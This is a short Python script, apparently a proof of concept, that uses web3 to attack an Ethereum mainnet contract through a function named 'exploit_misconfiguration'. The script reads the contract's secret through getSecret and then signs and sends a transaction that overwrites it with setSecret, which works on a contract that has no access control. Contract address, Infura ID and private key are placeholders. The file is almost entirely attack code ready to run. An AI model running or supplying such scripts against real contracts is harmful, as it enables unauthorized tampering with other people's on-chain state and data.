from web3 import Web3

# Configuration
INFURA_URL = 'https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID'
CONTRACT_ADDRESS = '0xYourContractAddress'
ABI = [
    {
        "constant": True,
        "inputs": [],
        "name": "getSecret",
        "outputs": [{"name": "", "type": "string"}],
        "payable": False,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [{"name": "newSecret", "type": "string"}],
        "name": "setSecret",
        "outputs": [],
        "payable": False,
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

# Connect to the Ethereum network
web3 = Web3(Web3.HTTPProvider(INFURA_URL))
contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=ABI)

def exploit_misconfiguration():
    # Access the secret
    try:
        secret = contract.functions.getSecret().call()
        print(f"Secret accessed: {secret}")
    except Exception as e:
        print("Failed to access secret:", e)

    # Set a new secret (requires a valid Ethereum account)
    try:
        # Replace 'your_private_key' with the actual private key of an account with sufficient ETH
        private_key = 'your_private_key'
        account = web3.eth.account.privateKeyToAccount(private_key)
        
        # Prepare transaction
        transaction = contract.functions.setSecret("NewExploitSecret").buildTransaction({
            'chainId': 1,  # Mainnet
            'gas': 2000000,
            'gasPrice': web3.toWei('10', 'gwei'),
            'nonce': web3.eth.getTransactionCount(account.address),
        })
        
        # Sign transaction
        signed_txn = web3.eth.account.sign_transaction(transaction, private_key=private_key)
        
        # Send transaction
        tx_hash = web3.eth.sendRawTransaction(signed_txn.rawTransaction)
        web3.eth.waitForTransactionReceipt(tx_hash)
        
        print("New secret set successfully.")
    except Exception as e:
        print("Failed to set new secret:", e)

# Run the misconfiguration exploit
exploit_misconfiguration()
